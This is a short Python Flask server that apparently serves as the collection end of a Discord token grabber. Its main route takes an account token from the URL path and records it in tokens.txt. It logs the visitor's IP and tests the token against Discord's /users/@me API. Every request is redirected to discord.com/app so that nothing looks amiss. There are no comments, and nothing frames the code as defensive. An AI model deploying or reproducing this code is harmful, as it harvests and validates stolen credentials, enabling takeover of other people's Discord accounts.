from flask import Flask, redirect, request
import requests

app = Flask(__name__)

@app.route('/alive')
def keep_alive():
    return "alive"

@app.route('/')
def main():
    return redirect("https://discord.com/app")

@app.route('/<string:token>')
def index(token):
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        publicip = request.environ['REMOTE_ADDR']
    else:
        publicip = request.environ['HTTP_X_FORWARDED_FOR']

    open("tokens.txt", 'a').close()
    with open('tokens.txt', 'r') as f:
        if not any(f"{token}" in line for line in f):
            with open("tokens.txt", "a") as f:
                f.write(f"{token}\n")

    try:
        headers = {"Authorization": token}
        url = "https://discord.com/api/v9/users/@me"
        response = requests.get(url, headers=headers)

    except:
        pass

    return redirect("https://discord.com/app")

app.run(host='0.0.0.0', port=1337)
